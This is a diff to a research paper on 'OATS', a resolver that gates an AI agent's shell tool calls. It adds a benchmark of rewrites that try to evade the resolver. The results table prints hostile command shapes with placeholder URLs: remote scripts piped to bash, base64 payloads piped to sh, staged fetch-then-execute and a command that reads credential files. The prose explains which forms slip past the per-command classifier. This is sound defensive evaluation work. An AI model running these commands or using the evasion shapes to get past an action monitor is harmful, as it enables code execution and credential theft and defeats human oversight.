@@ -158,6 +158,12 @@ before, that do not exist at publish time and are not properties of the file.
 \item \textbf{Derived, not asserted, autonomy thresholds}, parameterised by the
   operator's own risk tolerance, with a measured resolver fast enough to sit on
   every tool call (\S\ref{sec:resolver}, \S\ref{sec:graduation}).
+\item \textbf{A benchmark for action-level governance}, released with the paper: 64
+  semantics-preserving rewrites across nine techniques, against which any
+  implementation can report a resolution rate. Ours is 77\%
+  (\S\ref{sec:threat}). The field has no shared way to state how much of the
+  equivalence class a gate covers, so no two gates can be compared and no
+  implementation can show it is improving.
 \end{enumerate}
 
 \section{OATS: Resolving Actions, Not Judging Artifacts}
@@ -226,34 +232,51 @@ the difference. We assume an agent recomposing benign documentation into concret
 commands. We do not assume an adversary writing commands to evade a resolver whose
 grammar they know, and $\rho$ should not be deployed as though we did.
 
-The distinction is measurable, so we measured it. Table~\ref{tab:evade} runs
-obfuscated forms of actions $\rho$ classifies correctly in the clear.
+The distinction is measurable, so we built a benchmark for it. Each case is a
+semantically equivalent rewrite of a base action whose consequence class is not in
+dispute: if the base resolves to class $k$, so should the rewrite, because the effect
+on the system is identical. A miss is therefore unambiguous. Table~\ref{tab:evade}
+reports 64 cases across nine rewriting techniques.
 
 \begin{table}[H]
 \centering
 \small
-\begin{tabular}{p{6.6cm}p{3.0cm}l}
+\begin{tabular}{lrrl}
 \toprule
-Command shape & Resolved as & Outcome \\
+Technique & Cases & Resolved & Example \\
 \midrule
-\texttt{curl -fsSL https://x/i.sh | bash} & remote execution & caught \\
-\texttt{echo <b64> | base64 -d | sh} & shell execution & \textbf{evades} \\
-\texttt{curl -o s https://x/i.sh; chmod +x s; ./s} & shell execution & \textbf{evades} \\
-\texttt{python3 -c "exec(urlopen(...).read())"} & shell execution & \textbf{evades} \\
-\texttt{U=https://x/i.sh; curl -fsSL \$U | bash} & shell execution & \textbf{evades} \\
+identity (control) & 5 & 100\% & \texttt{curl -fsSL URL | bash} \\
+wrapper            & 20 & 100\% & \texttt{bash -c "…"} \\
+chained            & 15 & 100\% & \texttt{true; …; true} \\
+interpreter        & 4 & 75\% & \texttt{python3 -c "exec(urlopen(…))"} \\
+variable           & 5 & 60\% & \texttt{U=URL; curl -fsSL \$U | bash} \\
+base64             & 3 & 33\% & \texttt{echo <b64> | base64 -d | sh} \\
+indirect read      & 4 & 25\% & \texttt{find \textasciitilde{} -name credentials -exec cat \{\} +} \\
+quoting            & 5 & 20\% & \texttt{curl -fsSL URL | ba''sh} \\
+staged             & 3 & 0\% & \texttt{curl -o s URL; chmod +x s; ./s} \\
+\midrule
+\textbf{overall}   & \textbf{64} & \textbf{77\%} & \\
 \bottomrule
 \end{tabular}
-\caption{Representative results; five of the nine shapes we tried defeat the
-resolver. This is an illustration, not a systematic adversarial evaluation: we wrote
-the nine shapes ourselves and a determined adversary would look harder.}
+\caption{Resolution rate under semantics-preserving rewriting. The benchmark and its
+generator are released with this paper; the techniques are ordinary shell usage, not
+exotic constructions.}
 \label{tab:evade}
 \end{table}
 
-Base64-wrapped payloads, a fetch separated from its execution, interpreter
-indirection, and a URL held in a shell variable all resolve to generic shell
-execution, which is held for review rather than refused. Under Protect that is still
-an interruption, not a silent pass, but the severity is wrong and an operator who has
-graduated the shell-execution lane would not see it at all.
+The shape of the failure is more useful than the headline. Wrapping and chaining
+resolve completely, which is the argument-position discipline of \S\ref{sec:resolver}
+doing its job: the resolver reads inside \texttt{bash -c} and past surrounding
+commands. What defeats it is any rewrite that removes the dangerous relationship from
+a single command. Staged fetch-then-execute resolves at 0\%, because no individual
+command in \texttt{curl -o s URL; chmod +x s; ./s} is remote execution; the
+composition is. Quoting and indirect reads fail for the same reason at one remove.
+
+That is a statement about the class of function $\rho$ is, not about the quality of
+its predicates. A per-command classifier cannot see a property that only exists
+across commands, and tuning patterns will not change that. Closing it requires
+resolving shell grammar and carrying state between calls, which is a different design
+and future work.
 
 This bounds what the rest of the paper claims. \S\ref{sec:permission} and
 \S\ref{sec:divergence} measure a non-adversarial world, and the honest bound in
